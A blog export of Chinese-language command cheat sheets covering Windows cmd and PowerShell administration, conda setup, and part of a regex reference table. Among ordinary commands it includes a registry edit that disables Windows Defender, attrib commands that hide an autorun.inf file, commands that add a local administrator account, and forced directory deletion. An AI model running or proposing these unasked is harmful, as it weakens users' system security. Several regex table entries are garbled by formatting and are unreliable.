<h2 id="Linux子系统"><a href="#Linux子系统" class="headerlink" title="Linux子系统"></a>Linux子系统</h2><figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># 查看子系统列表及分发版本</span></span><br><span class="line"><span class="title">wsl</span> -l -v</span><br><span class="line"></span><br><span class="line"><span class="meta"># 卸载已经安装的发行版</span></span><br><span class="line"><span class="title">wslconfig</span> /unregister &lt;name&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta"># 升级wsl版本</span></span><br><span class="line"><span class="title">wsl</span> <span class="comment">--set-version &lt;distribution name&gt; &lt;versionNumber&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 关闭 所有WSL服务</span></span><br><span class="line"><span class="title">wsl</span> <span class="comment">--shudown</span></span><br><span class="line"><span class="title">net</span> stop <span class="type">LxssManager</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 移动WSL</span></span><br><span class="line"><span class="meta"># https://github.com/DDoSolitary/LxRunOffline</span></span><br><span class="line"><span class="type">LxRunOffline</span>.exe move -n &lt;wsl-name&gt; -d &lt;dir&gt;</span><br><span class="line"></span><br><span class="line"><span class="title">lxrunoffline</span> m -n docker-desktop -d <span class="type">D</span>:\<span class="type">OWQ</span>\<span class="type">Docker</span>\wsl\distro</span><br><span class="line"><span class="title">lxrunoffline</span> m -n docker-desktop-<span class="class"><span class="keyword">data</span> -d <span class="type">D</span>:\<span class="type">OWQ</span>\<span class="type">Docker</span>\wsl\<span class="keyword">data</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 查看路径</span></span><br><span class="line"><span class="title">lxrunoffline</span> di -n docker-desktop</span><br><span class="line"><span class="title">lxrunoffline</span> di -n docker-desktop-<span class="class"><span class="keyword">data</span></span></span><br></pre></td></tr></table></figure>

<h3 id="WSL2端口转发"><a href="#WSL2端口转发" class="headerlink" title="WSL2端口转发"></a>WSL2端口转发</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置端口转发</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenport=【宿主机windows平台监听端口】 listenaddress=<span class="number">0.0</span>.<span class="number">0.0</span> connectport=【wsl2平台监听端口】 connectaddress=【wsl2平台ip】protocol=tcp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">netsh interface portproxy add v4tov4 listenport=<span class="number">80</span> listenaddress=<span class="number">0.0</span>.<span class="number">0.0</span> connectport=<span class="number">80</span> connectaddress=<span class="number">172.30</span>.<span class="number">144.91</span> protocol=tcp</span><br><span class="line">或</span><br><span class="line">netsh interface portproxy add v4tov4 listenport=<span class="number">80</span> listenaddress=* connectport=<span class="number">80</span> connectaddress=<span class="number">172.30</span>.<span class="number">144.91</span> protocol=tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看端口转发状态</span></span><br><span class="line">netsh interface portproxy show all</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除端口转发</span></span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=【宿主机windows平台监听端口】 listenaddress=<span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"></span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=<span class="number">80</span> listenaddress=*</span><br><span class="line">或</span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=<span class="number">80</span> listenaddress=<span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意: 写的是0.0.0.0删的时候也需要是0.0.0.0进行对应，不然会提示找不到文件。</span></span><br></pre></td></tr></table></figure>



<h2 id="空间优化"><a href="#空间优化" class="headerlink" title="空间优化"></a>空间优化</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 压缩系统空间</span></span><br><span class="line">compact /compactos:always</span><br></pre></td></tr></table></figure>



<h2 id="修复命令"><a href="#修复命令" class="headerlink" title="修复命令"></a>修复命令</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SFC扫描</span></span><br><span class="line">sfc /scannow</span><br><span class="line"></span><br><span class="line"><span class="comment"># DISM扫描</span></span><br><span class="line">DISM /Online /Cleanup<span class="literal">-Image</span> /RestoreHealth</span><br><span class="line"></span><br><span class="line"><span class="comment"># 磁盘修复</span></span><br><span class="line">chkdsk C:/f</span><br></pre></td></tr></table></figure>



<h2 id="文件目录"><a href="#文件目录" class="headerlink" title="文件目录"></a>文件目录</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除文件/目录</span></span><br><span class="line"><span class="built_in">rmdir</span> /s/q &lt;<span class="built_in">dir</span>&gt; 删除整个目录</span><br><span class="line">    /s 是代表删除所有子目录跟其中的档案。 </span><br><span class="line">    /q 是不要它在删除档案或目录时，不再问我 Yes or No 的动作。 </span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建目录</span></span><br><span class="line"><span class="built_in">md</span> &lt;catalogue&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件只读、隐藏属性修改</span></span><br><span class="line">attrib S <span class="built_in">H</span></span><br><span class="line"><span class="comment"># 查看帮助(cmd)</span></span><br><span class="line">help attrib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将文件或目录彻底隐藏在资源管理器中</span></span><br><span class="line">attrib +s +a +<span class="built_in">h</span> +<span class="built_in">r</span> D:\\ico.ico</span><br><span class="line">attrib +s +a +<span class="built_in">h</span> +<span class="built_in">r</span> D:\\autorun.inf</span><br><span class="line"><span class="comment"># 恢复正常显示</span></span><br><span class="line">attrib <span class="literal">-s</span> <span class="literal">-a</span> <span class="literal">-h</span> <span class="literal">-r</span> C:\\ico.ico</span><br></pre></td></tr></table></figure>



<h2 id="电源相关"><a href="#电源相关" class="headerlink" title="电源相关"></a>电源相关</h2><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 电源控制</span></span><br><span class="line"><span class="keyword">shutdown</span> <span class="string">/s</span>			关机</span><br><span class="line"><span class="keyword">shutdown</span> <span class="string">/r</span>			重启</span><br><span class="line"><span class="keyword">shutdown</span> <span class="string">/l</span>			注销</span><br><span class="line"><span class="keyword">shutdown</span> <span class="string">/h</span> <span class="string">/f</span>		休眠</span><br><span class="line"><span class="keyword">shutdown</span> <span class="string">/a</span>			取消关机</span><br><span class="line"><span class="keyword">shutdown</span> <span class="string">/s</span> <span class="string">/t</span> 3600	定时关机（单位秒）</span><br></pre></td></tr></table></figure>



<h2 id="网络相关"><a href="#网络相关" class="headerlink" title="网络相关"></a>网络相关</h2><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 网卡信息</span></span><br><span class="line">ipconfig</span><br><span class="line"></span><br><span class="line"><span class="comment"># 路由跟踪</span></span><br><span class="line">tracert &lt;域名&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 网关(DNS)查询</span></span><br><span class="line">nslookup &lt;域名&gt; [DNS服务器]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看路由表</span></span><br><span class="line">route print</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置承载网络模式</span></span><br><span class="line">netsh wlan <span class="keyword">set</span> hostednetwork mode=allow</span><br><span class="line"><span class="comment"># 设置无线热点名称和密码</span></span><br><span class="line">netsh wlan <span class="keyword">set</span> hostednetwork ssid=CooNb key=<span class="string">&quot;passwprd&quot;</span></span><br><span class="line"><span class="comment"># 启动承载网络</span></span><br><span class="line">netsh wlan start hostednetwork</span><br><span class="line"></span><br><span class="line"><span class="comment"># HTTP 代理设置</span></span><br><span class="line"><span class="keyword">set</span> http_proxy=http:<span class="string">//127.0.0.1</span><span class="function">:7890</span></span><br><span class="line"><span class="keyword">set</span> https_proxy=http:<span class="string">//127.0.0.1</span><span class="function">:7890</span></span><br><span class="line"><span class="comment"># SOCKS5 代理设置</span></span><br><span class="line"><span class="keyword">set</span> http_proxy=socks5:<span class="string">//127.0.0.1</span><span class="function">:7890</span></span><br><span class="line"><span class="keyword">set</span> https_proxy=socks5:<span class="string">//127.0.0.1</span><span class="function">:7890</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取消代理</span></span><br><span class="line"><span class="keyword">unset</span> http_proxy &amp; <span class="keyword">unset</span> https_proxy</span><br><span class="line"></span><br><span class="line"><span class="comment"># 代理检测</span></span><br><span class="line">curl -vv http:<span class="string">//www.google.com</span></span><br></pre></td></tr></table></figure>



<h2 id="编码相关"><a href="#编码相关" class="headerlink" title="编码相关"></a>编码相关</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看当前编码</span></span><br><span class="line">chcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改为UTF-8</span></span><br><span class="line">chcp 65001</span><br><span class="line">    - 65001  UTF-8</span><br><span class="line">    - 20936  GB2312</span><br><span class="line">    - 936    GBK</span><br><span class="line">    - 437    English US</span><br></pre></td></tr></table></figure>



<h2 id="实用设置"><a href="#实用设置" class="headerlink" title="实用设置"></a>实用设置</h2><h3 id="添加新建文本快捷键"><a href="#添加新建文本快捷键" class="headerlink" title="添加新建文本快捷键"></a>添加新建文本快捷键</h3><ul>
<li><code>Win + R</code>运行<code>regedit</code>找到<code>HKEY_CLASSES_ROOT\LocalSettings\ImmutableMuiCache\Strings\AAF68885</code></li>
<li>之后找到右侧的<code>@C:\Windows\system32\notepad.exe,-469</code>，将值 <code>文本文档</code> 改为 <code>文本文档 (&amp;T)</code></li>
<li>重动资源管理器就可以看到效果了，<code>右键&gt;w&gt;t</code>就可以快速新建一个TXT文本了</li>
</ul>
<h3 id="改变CMD编码为UTF-8-以使用Truetype字体-不推荐"><a href="#改变CMD编码为UTF-8-以使用Truetype字体-不推荐" class="headerlink" title="改变CMD编码为UTF-8 以使用Truetype字体(不推荐)"></a>改变CMD编码为UTF-8 以使用Truetype字体(不推荐)</h3><ul>
<li><code>Win + R</code>运行<code>regedit</code>找到<code>HKEY_LOCAL_MACHINE\Software\Microsoft\CommandProcessor</code></li>
<li>修改<code>Autorun</code>的值为<code>@chcp 65001&gt;nul</code>，如果没有则创建一个字符串类型<code>Autorun</code>，把值设为<code>@chcp 65001&gt;nul</code></li>
<li>用管理员权限打开一个CMD窗口，输入<code>REG ADD &quot;HKLM\Software\Microsoft\Command Processor&quot; /v Autorun /t REG_SZ /d &quot;@chcp 65001&gt;nul&quot;</code></li>
<li>查看<code>\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Console\TrueTypeFont</code></li>
</ul>
<h2 id="疑难杂症"><a href="#疑难杂症" class="headerlink" title="疑难杂症"></a>疑难杂症</h2><h3 id="解决文件被占用"><a href="#解决文件被占用" class="headerlink" title="解决文件被占用"></a>解决文件被占用</h3><p>方法一</p>
<ul>
<li><p>定位进程<br><code>Win+R</code>打开【运行】-&gt; 输入<code>eventvwr.msc</code>回车打开【事件查看器】-&gt; 事件查看器 (本地) -&gt; Windows 日志-&gt; 系统 -&gt; 找到最近的【警告 来源 Kernel-PnP】-&gt; 双击打开 -&gt; 找到【进程ID为 xx 的应用程序已停止删除或弹出设备】，记住这个进程 ID。</p>
</li>
<li><p>结束进程</p>
<ul>
<li>打开【任务管理器】-&gt; 详细信息 -&gt; 点击 PID 排序 -&gt; 找到 ID 对应的进程，尝试结束进程。</li>
</ul>
</li>
</ul>
<p>方法二</p>
<ul>
<li><code>Win+R</code> 打开【运行】-&gt; 输入 <code>taskmgr</code> 回车打开【任务管理器】-&gt; 性能 -&gt; 打开资源监视器 -&gt; CPU -&gt; 关联的句柄 -&gt; 输入你的盘符, 例如你的移动存储设备是 F 盘, 输入 F: -&gt; 把下面搜索出来的进程全部结束。</li>
</ul>
<p>方法三</p>
<ul>
<li><code>Win+X</code> 打开 计算机管理 -&gt; 磁盘管理，右键，选择脱机</li>
</ul>
<h3 id="关机停留在等待程序关闭界面"><a href="#关机停留在等待程序关闭界面" class="headerlink" title="关机停留在等待程序关闭界面"></a>关机停留在等待程序关闭界面</h3><p>打开 <code>regedit</code></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop</span><br></pre></td></tr></table></figure>

<p>添加键：<code>AutoEndTasks</code> 值：1</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">bcdedit /<span class="built_in">set</span> bootstatuspolicy ignoreallfailures</span><br><span class="line">bcdedit /<span class="built_in">set</span> &#123;服务名&#125; recoveryenabled No  修改启动</span><br></pre></td></tr></table></figure>



<h3 id="网络正常图标显示无连接"><a href="#网络正常图标显示无连接" class="headerlink" title="网络正常图标显示无连接"></a>网络正常图标显示无连接</h3><p>打开 <code>regedit</code></p>
<figure class="highlight moonscript"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NlaSvc\Parameters\Internet</span><br></pre></td></tr></table></figure>

<p>修改 <code>EnableActiveProbing</code> 值为 0<br>打开 <code>services.msc</code> 服务管理<br>重启 <code>Microsoft Account Sign-in Assistant</code> 服务</p>
<h3 id="重置网络设置后WiFi图标消失"><a href="#重置网络设置后WiFi图标消失" class="headerlink" title="重置网络设置后WiFi图标消失"></a>重置网络设置后WiFi图标消失</h3><p><code>Win+R</code>输入<code>services.msc</code><br>找到<code>WLAN AutoConfig</code>和<code>Wired AutoConfig</code>服务，确保服务为开启状态</p>
<h3 id="访问不了网络"><a href="#访问不了网络" class="headerlink" title="访问不了网络"></a>访问不了网络</h3><ul>
<li>运行 inetcpl.cpl</li>
<li>高级--使用TLS1.2--还原高级设置</li>
</ul>
<h3 id="取消微软服务代理转发"><a href="#取消微软服务代理转发" class="headerlink" title="取消微软服务代理转发"></a>取消微软服务代理转发</h3><ul>
<li>安装<code>Fiddler4</code></li>
<li>打开左上角<code>winconfig</code></li>
<li>把微软产品全部打勾保存</li>
</ul>
<h3 id="禁用-x2F-恢复-Windows-Defender"><a href="#禁用-x2F-恢复-Windows-Defender" class="headerlink" title="禁用&#x2F;恢复 Windows Defender"></a>禁用&#x2F;恢复 Windows Defender</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 禁用</span></span><br><span class="line">reg add “HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender” /v “DisableAntiSpyware” /d <span class="number">1</span> /t REG_DWORD /f</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复</span></span><br><span class="line">reg add “HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender” /v “DisableAntiSpyware” /d <span class="number">0</span> /t REG_DWORD /f</span><br></pre></td></tr></table></figure>

<h3 id="用户权限问题"><a href="#用户权限问题" class="headerlink" title="用户权限问题"></a>用户权限问题</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 新建用户账号</span></span><br><span class="line">net user &lt;user&gt; &lt;passwd&gt; /add</span><br><span class="line"><span class="comment"># 赋予该账号管理员权限</span></span><br><span class="line">net localgroup administrators &lt;user&gt; /add</span><br><span class="line"><span class="comment"># 删除用户账号</span></span><br><span class="line">net user &lt;user&gt; /<span class="built_in">del</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>命令文档</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>cmd</tag>
        <tag>PowerShell</tag>
      </tags>
  </entry>
  <entry>
    <title>conda 命令</title>
    <url>/conda/</url>
    <content><![CDATA[<blockquote>
<p>Windows安装包：<span class="exturl" data-url="aHR0cHM6Ly9yZXBvLmNvbnRpbnV1bS5pby9taW5pY29uZGEvTWluaWNvbmRhMy1sYXRlc3QtV2luZG93cy14ODZfNjQuZXhl">https://repo.continuum.io/miniconda/Miniconda3-latest-Windows-x86_64.exe</span></p>
</blockquote>
<h2 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h2><ul>
<li><p>下载脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://repo.continuum.io/miniconda/Miniconda3-latest-Linux-x86_64.sh</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动脚本</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sh</span> Miniconda3-latest-Linux-x86_64.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>

<p>默认安装在<code>$HOME/miniconda3</code>下，这里我将其安装在<code>/usr/local/miniconda</code>下</p>
</li>
<li><p>取消默认激活conda环境</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">conda<span class="built_in"> config </span>--<span class="built_in">set</span> auto_activate_base <span class="literal">false</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>环境配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> /usr/local/miniconda/bin/activate <span class="comment"># 激活环境</span></span><br><span class="line">conda init zsh	<span class="comment"># 使用的终端</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="虚拟环境"><a href="#虚拟环境" class="headerlink" title="虚拟环境"></a>虚拟环境</h2><h3 id="创建环境"><a href="#创建环境" class="headerlink" title="创建环境"></a>创建环境</h3><ul>
<li><p>3.6</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">conda</span> create -n py-<span class="number">3</span>.<span class="number">6</span> python=<span class="number">3</span>.<span class="number">6</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>3.8</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">conda</span> create -n py-<span class="number">3</span>.<span class="number">8</span> python=<span class="number">3</span>.<span class="number">8</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>3.9</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">conda</span> create -n py-<span class="number">3</span>.<span class="number">9</span> python=<span class="number">3</span>.<span class="number">9</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>3.10</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">conda</span> create -n py-<span class="number">3</span>.<span class="number">10</span> python=<span class="number">3</span>.<span class="number">10</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="删除环境"><a href="#删除环境" class="headerlink" title="删除环境"></a>删除环境</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">conda <span class="built_in">remove</span> -n <span class="symbol">&lt;name&gt;</span> --<span class="keyword">all</span></span><br></pre></td></tr></table></figure>

<h3 id="退出环境"><a href="#退出环境" class="headerlink" title="退出环境"></a>退出环境</h3><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">conda deactivate</span></span><br></pre></td></tr></table></figure>



<h2 id="卸载操作"><a href="#卸载操作" class="headerlink" title="卸载操作"></a>卸载操作</h2><ul>
<li><p>删除安装目录</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">rm -rf <span class="regexp">/usr/</span>local/miniconda</span><br></pre></td></tr></table></figure>
</li>
<li><p>删除路径变量（终端配置文件）</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> <span class="attribute">PATH</span>=<span class="string">&quot;/usr/local/miniconda:<span class="variable">$PATH</span>&quot;</span> </span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>命令文档</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>venv</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式手册</title>
    <url>/regex/</url>
    <content><![CDATA[<h2 id="表达式全集"><a href="#表达式全集" class="headerlink" title="表达式全集"></a>表达式全集</h2><table>
<thead>
<tr>
<th align="center">字符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>*</strong></td>
<td align="left">将下一个字符标记为一个特殊字符、或一个原义字符、或一个向后引用、或一个八进制转义符。例如，<code>n</code>匹配字符<code>n</code>。<code>\n</code>匹配一个换行符。串行<code>\\</code>匹配<code>\</code>而<code>\(</code>则匹配<code>(</code>。</td>
</tr>
<tr>
<td align="center"><strong>^</strong></td>
<td align="left">匹配输入字符串的开始位置。如果设置了RegExp对象的Multiline属性，^也匹配<code>\n</code>或<code>\r</code>之后的位置。</td>
</tr>
<tr>
<td align="center"><strong>$</strong></td>
<td align="left">匹配输入字符串的结束位置。如果设置了RegExp对象的Multiline属性，$也匹配<code>\n</code>或<code>\r</code>之前的位置。</td>
</tr>
<tr>
<td align="center"><strong>*</strong></td>
<td align="left">匹配前面的子表达式零次或多次。例如，zo<em>能匹配<code>z</code>以及<code>zoo</code>。</em>等价于{0,}。</td>
</tr>
<tr>
<td align="center"><strong>+</strong></td>
<td align="left">匹配前面的子表达式一次或多次。例如，<code>zo+</code>能匹配<code>zo</code>以及<code>zoo</code>，但不能匹配<code>z</code>。+等价于{1,}。</td>
</tr>
<tr>
<td align="center"><strong>?</strong></td>
<td align="left">匹配前面的子表达式零次或一次。例如，<code>do(es)?</code>可以匹配<code>does</code>或<code>does</code>中的<code>do</code>。?等价于{0,1}。</td>
</tr>
<tr>
<td align="center"><strong>{<em>n</em>}</strong></td>
<td align="left"><em>n</em>是一个非负整数。匹配确定的<em>n</em>次。例如，<code>o&#123;2&#125;</code>不能匹配<code>Bob</code>中的<code>o</code>，但是能匹配<code>food</code>中的两个o。</td>
</tr>
<tr>
<td align="center"><strong>{<em>n</em>,}</strong></td>
<td align="left"><em>n</em>是一个非负整数。至少匹配<em>n</em>次。例如，<code>o&#123;2,&#125;</code>不能匹配<code>Bob</code>中的<code>o</code>，但能匹配<code>foooood</code>中的所有o。<code>o&#123;1,&#125;</code>等价于<code>o+</code>。<code>o&#123;0,&#125;</code>则等价于<code>o*</code>。</td>
</tr>
<tr>
<td align="center"><strong>{<em>n</em>,<em>m</em>}</strong></td>
<td align="left"><em>m</em>和<em>n</em>均为非负整数，其中<em>n</em>&lt;&#x3D;*m*。最少匹配*n*次且最多匹配*m*次。例如，<code>o&#123;1,3&#125;</code>将匹配<code>fooooood</code>中的前三个o。<code>o&#123;0,1&#125;</code>等价于<code>o?</code>。<br />请注意在逗号和两个数之间不能有空格。</td>
</tr>
<tr>
<td align="center"><strong>?</strong></td>
<td align="left">当该字符紧跟在任何一个其他限制符（*,+,?，{<em>n</em>}，{<em>n</em>,}，{<em>n</em>,<em>m</em>}）后面时，匹配模式是非贪婪的。<br />非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串<code>oooo</code>，<code>o+?</code>将匹配单个<code>o</code>，而<code>o+</code>将匹配所有<code>o</code>。</td>
</tr>
<tr>
<td align="center"><strong>.</strong></td>
<td align="left">匹配除<code>\n</code>之外的任何单个字符。要匹配包括<code>\*n</code>*在内的任何字符，请使用像<code>(.|\n)</code>的模式。</td>
</tr>
<tr>
<td align="center"><strong>(pattern)</strong></td>
<td align="left">匹配pattern并获取这一匹配。所获取的匹配可以从产生的Matches集合得到，在VBScript中使用SubMatches集合，在JScript中则使用$0…$9属性。要匹配圆括号字符，请使用<code>\(</code>或<code>\)</code>。</td>
</tr>
<tr>
<td align="center"><strong>(?:pattern)</strong></td>
<td align="left">匹配pattern但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用或字符<code>(|)</code>来组合一个模式的各个部分是很有用。<br />例如，<code>industr(?:y|ies)</code>就是一个比<code>industry|industries</code>更简略的表达式。</td>
</tr>
<tr>
<td align="center"><strong>(?&#x3D;pattern)</strong></td>
<td align="left">正向肯定预查，在任何匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。<br />例如，<code>Windows(?=95|98|NT|2000)</code>能匹配<code>Windows2000</code>中的<code>Windows</code>，但不能匹配<code>Windows3.1</code>中的<code>Windows</code>。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。</td>
</tr>
<tr>
<td align="center"><strong>(?!pattern)</strong></td>
<td align="left">正向否定预查，在任何不匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。<br />例如，<code>Windows(?!95|98|NT|2000)</code>能匹配<code>Windows3.1</code>中的<code>Windows</code>，但不能匹配<code>Windows2000</code>中的<code>Windows</code>。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。</td>
</tr>
<tr>
<td align="center"><strong>(?&lt;&#x3D;pattern)</strong></td>
<td align="left">反向肯定预查，与正向肯定预查类拟，只是方向相反。<br />例如，<code>(?&lt;=95|98|NT|2000)Windows</code>能匹配<code>2000Windows</code>中的<code>Windows</code>，但不能匹配<code>3.1Windows</code>中的<code>Windows</code>。</td>
</tr>
<tr>
<td align="center"><strong>(?&lt;!pattern)</strong></td>
<td align="left">反向否定预查，与正向否定预查类拟，只是方向相反。<br />例如，<code>(?&lt;!95|98|NT|2000)Windows</code>能匹配<code>3.1Windows</code>中的<code>Windows</code>，但不能匹配<code>2000Windows</code>中的<code>Windows</code>。</td>
</tr>
<tr>
<td align="center"><strong>x|y</strong></td>
<td align="left">匹配x或y。<br />例如，<code>z\food</code>能匹配<code>z</code>或<code>food</code>。<code>(z|f)ood</code>则匹配<code>zood</code>或<code>food</code>。</td>
</tr>
<tr>
<td align="center"><strong>[xyz]</strong></td>
<td align="left">字符集合。匹配所包含的任意一个字符。<br />例如，<code>[abc]</code>可以匹配<code>plain</code>中的<code>a</code>。</td>
</tr>
<tr>
<td align="center"><strong>[^xyz]</strong></td>
<td align="left">负值字符集合。匹配未包含的任意字符。<br />例如，<code>[^abc]</code>可以匹配<code>plain</code>中的<code>p</code>。</td>
</tr>
<tr>
<td align="center"><strong>[a-z]</strong></td>
<td align="left">字符范围。匹配指定范围内的任意字符。<br />例如，<code>[a-z]</code>可以匹配<code>a</code>到<code>z</code>范围内的任意小写字母字符。</td>
</tr>
<tr>
<td align="center"><strong>[^a-z]</strong></td>
<td align="left">负值字符范围。匹配任何不在指定范围内的任意字符。<br />例如，<code>[^a-z]</code>可以匹配任何不在<code>a</code>到<code>z</code>范围内的任意字符。</td>
</tr>
<tr>
<td align="center"><strong>\b</strong></td>
<td align="left">匹配一个单词边界，也就是指单词和空格间的位置。<br />例如，<code>er\b</code>可以匹配<code>never</code>中的<code>er</code>，但不能匹配<code>verb</code>中的<code>er</code>。</td>
</tr>
<tr>
<td align="center"><strong>\B</strong></td>
<td align="left">匹配非单词边界。<code>er\B</code>能匹配<code>verb</code>中的<code>er</code>，但不能匹配<code>never</code>中的<code>er</code>。</td>
</tr>
<tr>
<td align="center"><strong>\cx</strong></td>
<td align="left">匹配由x指明的控制字符。例如，\cM匹配一个Control-M或回车符。x的值必须为A-Z或a-z之一。否则，将c视为一个原义的<code>c</code>字符。</td>
</tr>
<tr>
<td align="center"><strong>\d</strong></td>
<td align="left">匹配一个数字字符。等价于[0-9]。</td>
</tr>
<tr>
<td align="center"><strong>\D</strong></td>
<td align="left">匹配一个非数字字符。等价于[^0-9]。</td>
</tr>
<tr>
<td align="center"><strong>\f</strong></td>
<td align="left">匹配一个换页符。等价于\x0c和\cL。</td>
</tr>
<tr>
<td align="center"><strong>\n</strong></td>
<td align="left">匹配一个换行符。等价于\x0a和\cJ。</td>
</tr>
<tr>
<td align="center"><strong>\r</strong></td>
<td align="left">匹配一个回车符。等价于\x0d和\cM。</td>
</tr>
<tr>
<td align="center"><strong>\s</strong></td>
<td align="left">匹配任何空白字符，包括空格、制表符、换页符等等。等价于[ \f\n\r\t\v]。</td>
</tr>
<tr>
<td align="center"><strong>\S</strong></td>
<td align="left">匹配任何非空白字符。等价于[^ \f\n\r\t\v]。</td>
</tr>
<tr>
<td align="center"><strong>\t</strong></td>
<td align="left">匹配一个制表符。等价于\x09和\cI。</td>
</tr>
<tr>
<td align="center"><strong>\v</strong></td>
<td align="left">匹配一个垂直制表符。等价于\x0b和\cK。</td>
</tr>
<tr>
<td align="center"><strong>\w</strong></td>
<td align="left">匹配包括下划线的任何单词字符。等价于<code>[A-Za-z0-9_]</code>。</td>
</tr>
<tr>
<td align="center"><strong>\W</strong></td>
<td align="left">匹配任何非单词字符。等价于<code>[^A-Za-z0-9_]</code>。</td>
</tr>
<tr>
<td align="center"><strong>\x<em>n</em></strong></td>
<td align="left">匹配<em>n</em>，其中<em>n</em>为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，<code>\x41</code>匹配<code>A</code>。<code>\x041</code>则等价于<code>\x04&amp;1</code>。正则表达式中可以使用ASCII编码。.</td>
</tr>
<tr>
<td align="center"><strong>*num</strong>*</td>
<td align="left">匹配<em>num</em>，其中<em>num</em>是一个正整数。对所获取的匹配的引用。<br />例如，<code>(.)\1</code>匹配两个连续的相同字符。</td>
</tr>
<tr>
<td align="center"><strong>*n</strong>*</td>
<td align="left">标识一个八进制转义值或一个向后引用。<br />如果*n<em>之前至少</em>n<em>个获取的子表达式，则</em>n<em>为向后引用。否则，如果</em>n<em>为八进制数字（0-7），则</em>n*为一个八进制转义值。</td>
</tr>
<tr>
<td align="center"><strong>*nm</strong>*</td>
<td align="left">标识一个八进制转义值或一个向后引用。<br />如果*nm<em>之前至少有</em>nm<em>个获得子表达式，则</em>nm<em>为向后引用。如果*nm</em>之前至少有<em>n</em>个获取，则<em>n</em>为一个后跟文字<em>m</em>的向后引用。如果前面的条件都不满足，若<em>n</em>和<em>m</em>均为八进制数字（0-7），则*nm<em>将匹配八进制转义值</em>nm*。</td>
</tr>
<tr>
<td align="center"><strong>*nml</strong>*</td>
